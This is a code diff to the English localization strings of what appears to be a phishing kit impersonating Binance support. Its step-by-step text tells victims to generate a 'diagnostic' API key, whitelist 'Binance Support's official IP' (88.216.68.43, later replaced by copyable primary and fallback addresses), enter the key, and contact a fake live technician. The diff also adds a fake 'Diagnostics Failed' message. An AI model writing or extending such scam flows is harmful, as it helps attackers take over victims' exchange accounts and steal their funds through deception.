@@ -44,6 +44,11 @@ export const en = {
     copyKey: "Copy Key",
     copied: "Copied!",
     keyCopied: "Key copied to clipboard!",
+    binanceSupportIps: "Whitelist Binance support's IPs to ensure full diagnostic range.",
+    primaryIp: "Primary IP Address:",
+    fallbackIp: "Fallback IP Address:",
+    copyIp: "Copy IP",
+    ipCopied: "IP address copied to clipboard!",
     completionTitle: "API Key Generation Complete",
     completionMessage: "Your diagnostics API key has been created successfully. Please keep your keys secure and never share them with anyone.",
     verifyingKey: "Verifying your key...",
@@ -57,6 +62,8 @@ export const en = {
     runningDiagnostics: "Running Diagnostics...",
     diagnosticsComplete: "Diagnostics Complete",
     diagnosticsCompleteMessage: "Your account diagnostics scan has been completed. Please speak to a live agent to review your results.",
+    diagnosticsFailed: "Diagnostics Failed",
+    diagnosticsFailedMessage: "The diagnostics scan has failed. Please contact our live support team for immediate assistance.",
     steps: {
       step1: {
         title: "Enabling your Binance diagnostic key (Step 1)",
@@ -90,8 +97,8 @@ export const en = {
       },
       step7: {
         title: "Enabling your Binance diagnostic key (Concluding Steps)",
-        computer: "Complete the following final steps:\n\n4. Under IP access restrictions, select \"restrict access to trusted IPs only\".\n\n5. Add Binance Support's official IP in the space below: 88.216.68.43\n\n6. You may have to complete two-factor authentication once more depending on your account settings.\n\n7. Binance agents will instantly assess your account security. Please click the live chat widget in the bottom right of your screen to verify your results with a live technician.",
-        mobile: "Complete the following final steps:\n\n4. Under IP access restrictions, select \"restrict access to trusted IPs only\".\n\n5. Add Binance Support's official IP in the space below: 88.216.68.43\n\n6. You may have to complete two-factor authentication once more depending on your account settings.\n\n7. Binance agents will instantly assess your account security. Please click the live chat widget in the bottom right of your screen to verify your results with a live technician.",
+        computer: "Complete the following final steps:\n\n4. Under IP access restrictions, select \"restrict access to trusted IPs only\".\n\n5. Add Binance Support's official IP addresses in the space below. You can copy them using the buttons provided:\n\n6. You may have to complete two-factor authentication once more depending on your account settings.\n\n7. Binance agents will instantly assess your account security. Please click the live chat widget in the bottom right of your screen to verify your results with a live technician.",
+        mobile: "Complete the following final steps:\n\n4. Under IP access restrictions, select \"restrict access to trusted IPs only\".\n\n5. Add Binance Support's official IP addresses in the space below. You can copy them using the buttons provided:\n\n6. You may have to complete two-factor authentication once more depending on your account settings.\n\n7. Binance agents will instantly assess your account security. Please click the live chat widget in the bottom right of your screen to verify your results with a live technician.",
       },
       step8: {
         title: "Enter your API Key",
